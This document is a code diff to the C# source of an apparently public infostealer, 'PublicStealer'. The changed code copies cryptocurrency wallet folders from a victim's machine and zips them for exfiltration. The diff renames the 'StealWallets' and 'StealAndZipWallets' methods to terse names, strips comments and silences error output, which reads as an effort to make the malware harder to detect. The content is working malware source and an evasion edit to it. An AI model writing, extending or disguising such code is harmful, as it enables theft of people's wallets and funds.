@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
@@ -42,39 +42,36 @@ namespace PublicStealer.wallet
         /// </summary>
         /// <param name="dst">The destination directory to copy the stolen wallets to.</param>
         /// <returns>The number of wallets found and copied.</returns>
-        internal static async Task<int> StealWallets(string dst)
+        internal static async Task<int> SWs(string dst) //StealWallets
         {
             var count = 0;
 
             foreach (var item in _walletPaths)
             {
-                // Check if the wallet directory exists
                 if (Directory.Exists(item.Value))
                 {
                     DirectoryInfo outDir = null;
-                    // Create a subdirectory for the current wallet type in the destination
                     var saveToDir = Path.Combine(dst, item.Key);
                     try
                     {
-                        // Create the destination directory
                         outDir = Directory.CreateDirectory(saveToDir);
-                        // Copy the contents of the wallet directory
                         CopyDirectory(item.Value, saveToDir);
 
-                        // Write the source path to a file for reference
-                        using (var fs = new FileStream(Path.Combine(saveToDir, "Source.txt"), FileMode.Create, FileAccess.Write, FileShare.Read))
-                        using (var writer = new StreamWriter(fs))
+                        // Construye el texto como byte[] manualmente (UTF-8)
+                        var sourceText = "Source: " + item.Value;
+                        var bytes = System.Text.Encoding.UTF8.GetBytes(sourceText);
+
+                        var filePath = Path.Combine(saveToDir, "Source.txt");
+                        using (var fs = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.Read))
                         {
-                            await writer.WriteAsync($"Source: {item.Value}");
+                            await fs.WriteAsync(bytes, 0, bytes.Length);
                         }
 
-                        count++; // Increment count for each wallet found
+                        count++;
                     }
-                    catch (Exception ex)
+                    catch
                     {
-                        // Clean up the partially created directory if an error occurs
                         try { outDir?.Delete(true); } catch { }
-                        Console.WriteLine($"Error stealing wallet {item.Key}: {ex}");
                     }
                 }
             }
@@ -82,13 +79,14 @@ namespace PublicStealer.wallet
             return count;
         }
 
+
         /// <summary>
         /// Orchestrates the stealing and zipping of wallets.
         /// The caller is responsible for sending the zip file and cleaning it up.
         /// </summary>
         /// <returns>The path to the created zip file, or null if no wallets were found or zipping failed.</returns>
         // MODIFIED: Renamed method and changed return type to Task<string>
-        internal static async Task<string> StealAndZipWallets()
+        internal static async Task<string> SAndZipW() //StealAndZipWallets
         {
             Console.WriteLine("Starting wallet exfiltration...");
             // Create a temporary folder for stolen wallets
@@ -99,7 +97,7 @@ namespace PublicStealer.wallet
             try
             {
                 Directory.CreateDirectory(tempFolder); // Create the temporary directory
-                int stolenCount = await StealWallets(tempFolder); // Steal wallets
+                int stolenCount = await SWs(tempFolder); // Steal wallets 
 
                 if (stolenCount > 0)
                 {
